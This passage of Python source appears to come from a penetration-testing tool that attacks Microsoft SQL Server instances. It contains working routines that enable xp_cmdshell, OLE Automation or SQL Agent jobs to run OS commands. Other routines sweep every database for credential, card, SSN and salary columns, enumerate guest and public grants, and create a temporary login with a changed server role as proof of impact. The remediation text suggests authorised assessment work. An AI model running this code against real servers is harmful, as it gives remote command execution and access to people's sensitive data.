    between @@X:out sentinels. Returns None for an unknown/handoff method (clr)."""
    lit = _tsql_lit(command)
    tmp = _EXEC_TMP
    read = (f"SELECT BulkColumn FROM OPENROWSET(BULK '{tmp}', SINGLE_CLOB) AS x")
    if method == "xp":
        body = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;\n"
                "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;\n"
                f"EXEC xp_cmdshell '{lit}'")
    elif method == "ole":
        inner = _tsql_lit(f"cmd.exe /c {command} > {tmp} 2>&1")
        body = ("EXEC sp_configure 'show advanced options',1;RECONFIGURE;\n"
                "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;\n"
                "DECLARE @o INT;\n"
                "EXEC sp_OACreate 'WScript.Shell', @o OUT;\n"
                f"EXEC sp_OAMethod @o, 'Run', NULL, '{inner}', 0, 1;\n"
                "EXEC sp_OADestroy @o;\n"
                f"{read}")
    elif method == "agent":
        inner = _tsql_lit(f"cmd.exe /c {command} > {tmp} 2>&1")
        body = ("USE msdb;\n"
                "EXEC dbo.sp_add_job @job_name='recce_rce';\n"
                "EXEC dbo.sp_add_jobstep @job_name='recce_rce', @step_name='s1', "
                f"@subsystem='CmdExec', @command='{inner}';\n"
                "EXEC dbo.sp_add_jobserver @job_name='recce_rce';\n"
                "EXEC dbo.sp_start_job @job_name='recce_rce';\n"
                "WAITFOR DELAY '00:00:05';\n"
                f"{read};\n"
                "EXEC dbo.sp_delete_job @job_name='recce_rce'")
    else:
        return None
    return f"SELECT '@@X:out'\n{body}\nSELECT '@@XE:out'\nexit\n"


def parse_exec(output: str) -> str:
    """Extract the command output from between the @@X:out sentinels, dropping
    impacket's table chrome (separators, column header, NULLs)."""
    import re
    m = re.search(r"@@X:out\b(.*?)@@XE:out\b", output, re.S)
    if not m:
        return ""
    lines = []
    for line in m.group(1).splitlines():
        s = line.strip()
        if not s or "----" in s or s.startswith("@@") or s in ("output", "BulkColumn", "NULL"):
            continue
        lines.append(s)
    return "\n".join(lines)


def exec_command(ip: str, creds: dict, command: str, method: str = "xp",
                 port: int = _DEFAULT_PORT, windows_auth: bool = True):
    """Execute `command` on the instance via `method` and return (output, error,
    handoff). For method='clr' recce does NOT load an assembly (that's the existing
    tools' job) - it returns a handoff command instead."""
    if method == "clr":
        dom = creds.get("domain", "")
        who = f"{dom}/{creds.get('user', '')}:{creds.get('secret', '')}@{ip}" if dom \
            else f"{creds.get('user', '')}:{creds.get('secret', '')}@{ip}"
        ref = (f"mssqlpwner {who} custom-asm \"{command}\"   "
               "(or PowerUpSQL Invoke-SQLOSCmdCLR) - loads a signed CLR assembly")
        return None, None, ref
    script = build_exec_script(command, method)
    if script is None:
        return None, f"unknown method '{method}'", None
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
    if cmd is None:
        return None, "impacket-mssqlclient not installed", None
    out, err = _run_stdin(cmd, script, timeout=120)
    if err:
        return None, err, None
    return parse_exec(out), None, None


# --- data mining: databases -> tables -> interesting columns --------------------
_INTERESTING_COLS = ("pass", "pwd", "secret", "token", "apikey", "api_key", "ssn",
                     "social", "credit", "card", "cvv", "salary", "routing", "iban",
                     "passport", "license", "email", "phone", "birth", "dob", "pin",
                     "private", "seckey", "sessionkey", "creditcard")
_INTERESTING_TABLES = ("user", "account", "credential", "login", "password", "secret",
                       "customer", "employee", "payment", "card", "patient", "member",
                       "payroll", "salar", "ssn", "bank")
_SYSTEM_DBS = {"tempdb", "model"}


def _like_or(col: str, needles) -> str:
    return "(" + " OR ".join(f"{col} LIKE '%{n}%'" for n in needles) + ")"


def build_datamine_script(dbs: list[str]) -> str:
    """Per-database: list every table (schema.table + row count) and the columns
    whose name looks sensitive. DB_NAME() is emitted so a failed USE is detectable."""
    lines = []
    for i, db in enumerate(dbs):
        esc = db.replace("]", "]]")
        lines.append(f"USE [{esc}]")
        lines.append(f"SELECT '@@TBL:{i}'")
        lines.append(
            "SELECT DB_NAME()+'|'+s.name+'.'+t.name+'|'+CAST(SUM(p.rows) AS varchar(20)) "
            "FROM sys.tables t JOIN sys.schemas s ON t.schema_id=s.schema_id "
            "JOIN sys.partitions p ON t.object_id=p.object_id AND p.index_id IN (0,1) "
            "GROUP BY s.name,t.name")
        lines.append(f"SELECT '@@TBLE:{i}'")
        lines.append(f"SELECT '@@COL:{i}'")
        lines.append(
            "SELECT DB_NAME()+'|'+s.name+'.'+t.name+'.'+c.name FROM sys.columns c "
            "JOIN sys.tables t ON c.object_id=t.object_id "
            "JOIN sys.schemas s ON t.schema_id=s.schema_id WHERE "
            + _like_or("c.name", _INTERESTING_COLS))
        lines.append(f"SELECT '@@COLE:{i}'")
    lines.append("exit")
    return "\n".join(lines) + "\n"


def _section_rows(output: str, begin: str, end: str, db: str, ncols: int) -> list:
    import re
    m = re.search(rf"{re.escape(begin)}\b(.*?){re.escape(end)}\b", output, re.S)
    rows = []
    if m:
        for line in m.group(1).splitlines():
            s = line.strip()
            if "|" in s and "----" not in s and not s.startswith("@@"):
                parts = [c.strip() for c in s.split("|")]
                if len(parts) >= ncols and parts[0].lower() == db.lower():
                    rows.append(parts)
    return rows


def parse_datamine(output: str, dbs: list[str]) -> dict:
    """{db: {tables: [(schema.table, rows)], interesting: [schema.table.col]}}."""
    out = {}
    for i, db in enumerate(dbs):
        tbl = _section_rows(output, f"@@TBL:{i}", f"@@TBLE:{i}", db, 3)
        col = _section_rows(output, f"@@COL:{i}", f"@@COLE:{i}", db, 2)
        out[db] = {"tables": [(r[1], r[2]) for r in tbl],
                   "interesting": [r[1] for r in col]}
    return out


def run_datamine(dbs: list[str], runner) -> dict:
    dbs = [d for d in dbs if d.lower() not in _SYSTEM_DBS]
    if not dbs:
        return {}
    out = runner(build_datamine_script(dbs)) or ""
    if "@@TBL:" not in out:
        return {}
    return parse_datamine(out, dbs)


def datamine_findings(target: dict, mined: dict, creds: dict | None):
    """A data-at-risk finding from the mined structure: how many db(s)/table(s),
    which columns/tables look sensitive, and the command to read them."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    ctx = _ctx(target, creds)
    if not mined:
        return []
    ndb = len([d for d in mined if mined[d]["tables"]])
    total = sum(len(v["tables"]) for v in mined.values())
    sensitive_cols = {db: v["interesting"] for db, v in mined.items() if v["interesting"]}
    sensitive_tabs = {}
    for db, v in mined.items():
        hits = [t for t, _r in v["tables"]
                if any(n in t.lower() for n in _INTERESTING_TABLES)]
        if hits:
            sensitive_tabs[db] = hits
    if sensitive_cols or sensitive_tabs:
        bits = []
        for db, cols in list(sensitive_cols.items())[:8]:
            bits.append(f"{db} -> {', '.join(cols[:8])}")
        for db, tabs in list(sensitive_tabs.items())[:8]:
            bits.append(f"{db} tables: {', '.join(tabs[:6])}")
        return [_finding(
            "high", "Sensitive data accessible in the databases", tgt,
            f"Enumerated {ndb} database(s), {total} table(s). Sensitive items: "
            + " ; ".join(bits), "impacket-mssqlclient",
            _fill("impacket-mssqlclient <domain>/<user>:<pass>@<ip>   "
                  "# then SELECT the columns above (redact PII in your notes)", ctx),
            "Least-privilege the login off the data plane; encrypt/tokenise sensitive "
            "columns; monitor bulk reads.", ["CWE-200", "CWE-522"], kind="data_at_rest")]
    return [_finding(
        "info", f"Database inventory ({ndb} db, {total} tables)", tgt,
        f"Enumerated {ndb} database(s) and {total} table(s); no obviously sensitive "
        "column/table names matched.", "impacket-mssqlclient", "",
        "n/a - informational inventory.", ["CWE-200"], kind="data_at_rest")]


# --- per-database object permission mining --------------------------------------

def build_permmine_script(dbs: list[str]) -> str:
    """Per database: is 'guest' enabled (any login can enter), and what does the
    public/guest role actually hold (object + database-level GRANTs beyond CONNECT)."""
    lines = []
    for i, db in enumerate(dbs):
        esc = db.replace("]", "]]")
        lines.append(f"USE [{esc}]")
        lines.append(f"SELECT '@@GST:{i}'")
        lines.append(
            "SELECT DB_NAME()+'|guest_enabled' WHERE EXISTS (SELECT 1 FROM "
            "sys.database_permissions dp JOIN sys.database_principals pr ON "
            "dp.grantee_principal_id=pr.principal_id WHERE pr.name='guest' AND "
            "dp.permission_name='CONNECT' AND dp.state_desc='GRANT')")
        lines.append(f"SELECT '@@GSTE:{i}'")
        lines.append(f"SELECT '@@PBP:{i}'")
        lines.append(
            "SELECT DB_NAME()+'|'+pr.name+'|'+dp.permission_name+'|'+"
            "ISNULL(OBJECT_SCHEMA_NAME(dp.major_id)+'.'+OBJECT_NAME(dp.major_id),"
            "'(database)') FROM sys.database_permissions dp JOIN sys.database_principals "
            "pr ON dp.grantee_principal_id=pr.principal_id WHERE pr.name IN "
            "('public','guest') AND dp.state_desc='GRANT' AND dp.permission_name<>'CONNECT'")
        lines.append(f"SELECT '@@PBPE:{i}'")
    lines.append("exit")
    return "\n".join(lines) + "\n"


def parse_permmine(output: str, dbs: list[str]) -> dict:
    """{db: {guest: bool, grants: [(principal, permission, object)]}}."""
    out = {}
    for i, db in enumerate(dbs):
        g = _section_rows(output, f"@@GST:{i}", f"@@GSTE:{i}", db, 2)
        p = _section_rows(output, f"@@PBP:{i}", f"@@PBPE:{i}", db, 4)
        out[db] = {"guest": bool(g),
                   "grants": [(r[1], r[2], r[3]) for r in p]}
    return out


def run_permmine(dbs: list[str], runner) -> dict:
    dbs = [d for d in dbs if d.lower() not in _SYSTEM_DBS]
    if not dbs:
        return {}
    out = runner(build_permmine_script(dbs)) or ""
    if "@@GST:" not in out:
        return {}
    return parse_permmine(out, dbs)


def permmine_findings(target: dict, perms: dict, creds: dict | None):
    """Findings from the object-permission mining: databases where guest is enabled,
    and objects that public/guest can access (data exposure to every login)."""
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    ctx = _ctx(target, creds)
    fs = []
    guest_dbs = [db for db, v in perms.items() if v["guest"]]
    if guest_dbs:
        fs.append(_finding(
            "medium", f"'guest' enabled in {len(guest_dbs)} database(s)", tgt,
            "Any login (incl. low-privileged) can access: " + ", ".join(guest_dbs[:12])
            + ". The guest user is a foothold into each database's data.",
            "impacket-mssqlclient",
            _fill("EXECUTE AS USER='guest'; SELECT * FROM <db>.INFORMATION_SCHEMA.TABLES;",
                  ctx),
            "Revoke CONNECT from guest in user databases (guest should be disabled).",
            ["CWE-284"], kind="guest_enabled"))
    # Notable public/guest object grants (write/execute or broad read).
    strong = {"INSERT", "UPDATE", "DELETE", "EXECUTE", "CONTROL", "ALTER",
              "TAKE OWNERSHIP", "SELECT"}
    hits = []
    for db, v in perms.items():
        for principal, perm, obj in v["grants"]:
            if perm.upper() in strong:
                hits.append(f"{db}: {principal} {perm} {obj}")
    if hits:
        writeable = [h for h in hits if any(w in h for w in
                     ("INSERT", "UPDATE", "DELETE", "EXECUTE", "CONTROL", "ALTER"))]
        sev = "high" if writeable else "medium"
        fs.append(_finding(
            sev, "Objects accessible to public/guest (every login)", tgt,
            f"{len(hits)} object grant(s) to public/guest: " + " ; ".join(hits[:10])
            + ". Every authenticated login inherits these"
            + (" including write/execute." if writeable else " (read access)."),
            "impacket-mssqlclient",
            _fill("SELECT pr.name, dp.permission_name, OBJECT_NAME(dp.major_id) FROM "
                  "sys.database_permissions dp JOIN sys.database_principals pr ON "
                  "dp.grantee_principal_id=pr.principal_id WHERE pr.name IN "
                  "('public','guest');", ctx),
            "Revoke object grants from public/guest; grant to specific roles instead.",
            ["CWE-284", "CWE-732"], kind="object_perms"))
    return fs


# --- proof of impact: reversible write + permission modification ----------------

def build_write_proof_script(token: str) -> str:
    """A self-contained, REVERSIBLE proof of write access: create a table, write a
    field, modify it (before -> after), drop it. If sysadmin, also toggle a temp
    login's server-role membership and revert. Everything is undone in-script."""
    t = token
    return (
        "SELECT '@@W:begin'\n"
        f"CREATE TABLE ##recce_{t} (id INT, note VARCHAR(64))\n"
        f"INSERT INTO ##recce_{t} VALUES (1,'before')\n"
        f"SELECT 'INSERT|'+note FROM ##recce_{t} WHERE id=1\n"
        f"UPDATE ##recce_{t} SET note='MODIFIED_{t}' WHERE id=1\n"
        f"SELECT 'UPDATE|'+note FROM ##recce_{t} WHERE id=1\n"
        f"DROP TABLE ##recce_{t}\n"
        "IF IS_SRVROLEMEMBER('sysadmin')=1 BEGIN "
        f"CREATE LOGIN recce_{t} WITH PASSWORD='R3cce_{t}!Aa', CHECK_POLICY=OFF; "
        f"ALTER SERVER ROLE dbcreator ADD MEMBER recce_{t}; "
        f"SELECT 'PERM|'+CAST(IS_SRVROLEMEMBER('dbcreator','recce_{t}') AS varchar(2)); "
        f"ALTER SERVER ROLE dbcreator DROP MEMBER recce_{t}; "
        f"DROP LOGIN recce_{t}; END\n"
        "SELECT '@@W:end'\nexit\n")


def parse_write_proof(output: str) -> dict:
    """Extract INSERT|.., UPDATE|.., PERM|.. evidence lines from the proof output."""
    import re
    m = re.search(r"@@W:begin\b(.*?)@@W:end\b", output, re.S)
    ev = {}
    if m:
        for line in m.group(1).splitlines():
            s = line.strip()
            for tag in ("INSERT", "UPDATE", "PERM"):
                if s.startswith(tag + "|"):
                    ev[tag.lower()] = s.split("|", 1)[1]
    return ev


def prove_write(ip: str, creds: dict, token: str, port: int = _DEFAULT_PORT,
                windows_auth: bool = True):
    """Run the reversible write proof. Returns (evidence, error)."""
    cmd = _mssqlclient_cmd(ip, creds, port, windows_auth)
    if cmd is None:
        return None, "impacket-mssqlclient not installed"
    out, err = _run_stdin(cmd, build_write_proof_script(token))
    if err:
        return None, err
    ev = parse_write_proof(out)
    if not ev.get("update"):
        return None, "write not proven (no permission / login failed)"
    return ev, None


def write_proof_finding(target: dict, ev: dict, creds: dict | None):
    tgt = f"{target['ip']}:{target.get('port', _DEFAULT_PORT)}"
    parts = ["created a table, wrote a row ('before'), then MODIFIED the field to "
             f"'{ev.get('update', '')}', and dropped the table (reverted)"]
    if ev.get("perm") == "1":
        parts.append("added a temporary login to the 'dbcreator' server role, "
                     "confirmed the membership, then removed it and dropped the login "
                     "(reverted)")
    return _finding(
        "critical", "Proved write + permission-modify capability (reversible)", tgt,
        "Demonstrated impact non-destructively: " + "; ".join(parts) + ".",
        "impacket-mssqlclient",
        "recce mssql -u <user> -p <pass> --prove-write   # reversible proof",
        "Restrict DDL/DML and role-management rights to least privilege.",
        ["CWE-269", "CWE-284"], kind="write_proof")


# --- proof screenshots (terminal-style, for the technical walkthrough) ----------

def _html_escape(s: str) -> str:
    return (s or "").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def proof_html(command, output: str, prompt: str = "SQL>", banner: str = "") -> str:
    """A faithful, UNBRANDED terminal render of the command(s) and their captured
    output - what the operator's console showed - so the walkthrough screenshot reads
    as a genuine terminal capture, not a designed graphic. `command` is a line or a
    list of lines shown at `prompt`; `banner` is an optional first console line."""
    cmds = command if isinstance(command, (list, tuple)) else [command]
    lines = []
    if banner:
        lines.append(f"<span class='b'>{_html_escape(banner)}</span>")
    for c in cmds:
        lines.append(f"<span class='p'>{_html_escape(prompt)}</span> "
                     f"<span class='c'>{_html_escape(c)}</span>")
    if output:
        lines.append(_html_escape(output))
    lines.append(f"<span class='p'>{_html_escape(prompt)}</span> ")   # trailing prompt
    return (
        "<html><head><meta charset='utf-8'><style>"
        "html,body{margin:0;background:#0c0c0c}"
        ".t{padding:16px 18px;font-family:'DejaVu Sans Mono',Menlo,Consolas,monospace;"
        "font-size:14px;line-height:1.45;color:#e6e6e6;white-space:pre-wrap;"
        "word-break:break-word}"
        ".p{color:#4ec9b0}.c{color:#dcdcaa}.b{color:#808080}"
        "</style></head><body><div class='t'>"
        + "\n".join(lines) + "</div></body></html>")


# --- top-level analysis ---------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    """Convert MSSQL findings into Vuln objects, keyed by target ip, so they feed
    the main severity totals / Vulnerabilities sheet / writeups. Returns {ip:[Vuln]}."""
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "mssql", 1433)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            lhost: str = "<LHOST>", budget: float | None = None, progress=None) -> dict:
    """Full MSSQL analysis: pre-auth probes, findings, and the per-target runbook +
    chain. JSON-serialisable for the datastore + report. `budget` caps wall-clock
    seconds; `progress(i, n, target)` fires per target."""
    from . import svcprobe
    targets = mssql_targets(hosts)
    probes: dict = {}
    browser: dict = {}          # SQL Browser (UDP 1434) result cached per IP
    state: dict = {}

    def _one(t):
        key = f"{t['ip']}:{t['port']}"
        if active and t["ip"] not in browser:
            browser[t["ip"]] = sql_browser(t["ip"])
        probes[key] = probe_target(t["ip"], t["port"], active=active,
                                   instances=browser.get(t["ip"]) if active else None)
        # Recover the version from the pre-login when nmap missed it.
        pv = probes[key]["prelogin"].get("version")
        if pv and not t.get("version"):
            t["version"] = pv
        t["encryption"] = probes[key]["prelogin"].get("encryption", "")
        t["instances"] = probes[key]["instances"]
        return None

    for _t, _r in svcprobe.iter_probe(targets, _one, budget=budget,
                                      progress=progress, state=state):
        pass
    fs = findings(hosts, probes)
    runbooks = []
    for t in targets:
        runbooks.append({
            "target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
            "credfree": credfree_runbook(t, lhost),
            "credentialed": cred_runbook(t, creds, lhost),
            "chain": attack_chain(t, fs, creds)})
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fs.sort(key=lambda x: order.get(x["severity"], 5))
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}

